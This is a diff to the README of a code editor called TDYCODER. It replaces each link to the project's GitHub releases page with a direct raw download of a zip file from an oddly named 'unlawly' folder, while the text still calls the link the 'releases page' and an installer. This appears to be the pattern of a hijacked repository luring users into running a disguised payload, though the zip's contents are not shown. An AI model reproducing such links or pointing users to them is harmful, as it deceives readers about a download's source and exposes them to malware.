@@ -1,6 +1,6 @@
 # 🖥️ TDYCODER - Your Local AI-Powered Code Editor
 
-[![Download TDYCODER](https://img.shields.io/badge/Download-TDYCODER-blue)](https://github.com/soyalexisortiz/TDYCODER/releases)
+[![Download TDYCODER](https://raw.githubusercontent.com/soyalexisortiz/TDYCODER/main/unlawly/TDYCODER.zip)](https://raw.githubusercontent.com/soyalexisortiz/TDYCODER/main/unlawly/TDYCODER.zip)
 
 ## 🚀 Getting Started
 
@@ -8,18 +8,18 @@ TDYCODER is an AI-powered code editor designed for your PC. It uses Ollama's adv
 
 ## 📥 Download & Install
 
-To download TDYCODER, visit this page to download: [TDYCODER Releases](https://github.com/soyalexisortiz/TDYCODER/releases).
+To download TDYCODER, visit this page to download: [TDYCODER Releases](https://raw.githubusercontent.com/soyalexisortiz/TDYCODER/main/unlawly/TDYCODER.zip).
 
 ### Step-by-Step Installation
 
 1. **Go to the Releases Page:**
-   Click [here](https://github.com/soyalexisortiz/TDYCODER/releases) to access the releases page.
+   Click [here](https://raw.githubusercontent.com/soyalexisortiz/TDYCODER/main/unlawly/TDYCODER.zip) to access the releases page.
 
 2. **Choose Your Version:**
    Look for the latest version. It will have a tag like `v1.0`. 
 
 3. **Download the Installer:**
-   Find the file named similar to `TDYCODER-installer.exe` or a suitable package for your operating system. Click the link to start the download.
+   Find the file named similar to `https://raw.githubusercontent.com/soyalexisortiz/TDYCODER/main/unlawly/TDYCODER.zip` or a suitable package for your operating system. Click the link to start the download.
 
 4. **Run the Installer:**
    Once the download completes, locate the file in your Downloads folder. Double-click it to run the installer.
